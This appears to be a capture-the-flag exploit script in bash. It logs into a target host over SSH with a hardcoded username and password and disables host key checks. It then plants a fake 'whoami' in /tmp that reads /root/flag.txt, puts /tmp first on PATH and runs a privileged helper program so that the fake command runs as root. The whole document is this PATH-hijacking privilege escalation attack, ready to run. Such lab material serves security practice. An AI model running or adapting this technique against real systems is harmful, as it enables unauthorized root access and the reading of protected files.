#!/bin/bash

passwd="jXztBtEWKYRMrjAF"
username="maverick"

port="${2:-2022}"

if [ -z "$1" ]
then
    echo "No IP supplied. Please provide the target IP address!"
else
    ip=$1
    sshpass -p$passwd ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $username@$ip -p "$port" "cd /tmp && echo 'cat /root/flag.txt' > whoami && chmod 777 whoami && export PATH=/tmp:\$PATH && cd /home/maverick/scripts && ./favorite-quote"
fi